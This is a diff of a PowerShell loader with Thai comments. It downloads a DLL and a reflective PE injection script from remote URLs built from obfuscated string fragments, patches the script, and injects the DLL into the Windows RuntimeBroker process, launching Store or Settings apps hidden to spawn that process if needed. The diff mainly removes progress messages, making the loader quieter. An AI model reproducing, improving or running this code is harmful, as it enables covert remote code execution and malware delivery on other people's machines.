@@ -10,49 +10,43 @@ $_0x91A = @(
 "payload"
 ) -join ""
 
-Write-Host "[*] Searching for RuntimeBroker.exe..." -ForegroundColor Cyan
-
 # หา RuntimeBroker process
 $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
 
 if ($null -eq $targetProc) {
-    Write-Host "[!] RuntimeBroker not found, triggering Windows Store..." -ForegroundColor Yellow
-    
     # เปิด Windows Store เพื่อ trigger RuntimeBroker
     Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 3
     
-    # ลองหาอีกครั้ง
     $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
     
     if ($null -eq $targetProc) {
         # ลองเปิด Settings app
-        Write-Host "[*] Trying Settings app..." -ForegroundColor Yellow
         Start-Process "ms-settings:" -WindowStyle Hidden -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 3
         
         $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
         
         if ($null -eq $targetProc) {
-            Write-Host "[ERROR] RuntimeBroker still not found. Please open any Windows Store app manually." -ForegroundColor Red
-            Write-Host "[INFO] Try opening: Calculator, Settings, or Microsoft Store" -ForegroundColor Cyan
+            Write-Host "[ERROR] RuntimeBroker not found" -ForegroundColor Red
             exit 1
         }
     }
 }
 
 $targetPID = $targetProc.Id
-Write-Host "[+] Found RuntimeBroker PID: $targetPID" -ForegroundColor Green
 
 # ดาวน์โหลด DLL
-Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
 $_0x7C1 = New-Object System.Net.WebClient
 $_0x7C1.Headers.Add("User-Agent", "Mozilla/5.0")
 $_0x5F9 = $_0x7C1.DownloadData($_0x91A)
-Write-Host "[+] DLL downloaded ($($_.0x5F9.Length) bytes)" -ForegroundColor Green
+
+if ($_0x5F9.Length -eq 0) {
+    Write-Host "[ERROR] Failed to download DLL" -ForegroundColor Red
+    exit 1
+}
 
 # ดาวน์โหลด Reflective PE Injection script
-Write-Host "[*] Downloading injection script..." -ForegroundColor Cyan
 $_0x3D2 = @(
 "https://raw",
 ".githubusercontent",
@@ -65,7 +59,7 @@ $_0x3D2 = @(
 $_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
 Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
 
-# แก้ไข script (fix GetProcAddress และ GetModuleHandle)
+# แก้ไข script
 $_0xA77 = Get-Content $_0x8E4 -Raw
 $_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
 $_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
@@ -76,8 +70,7 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 # โหลด injection script
 . $_0xC11
 
-# Inject เข้า RuntimeBroker
-Write-Host "[*] Injecting into RuntimeBroker PID $targetPID..." -ForegroundColor Cyan
+# Inject
 try {
     Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $targetPID
     Write-Host "[SUCCESS] Injection completed!" -ForegroundColor Green
@@ -85,9 +78,3 @@ try {
     Write-Host "[ERROR] Injection failed: $_" -ForegroundColor Red
     exit 1
 }
-
-# เปิด PowerShell history (optional)
-Start-Process "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-
-Write-Host "`n[*] Done! Press any key to exit..." -ForegroundColor Cyan
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
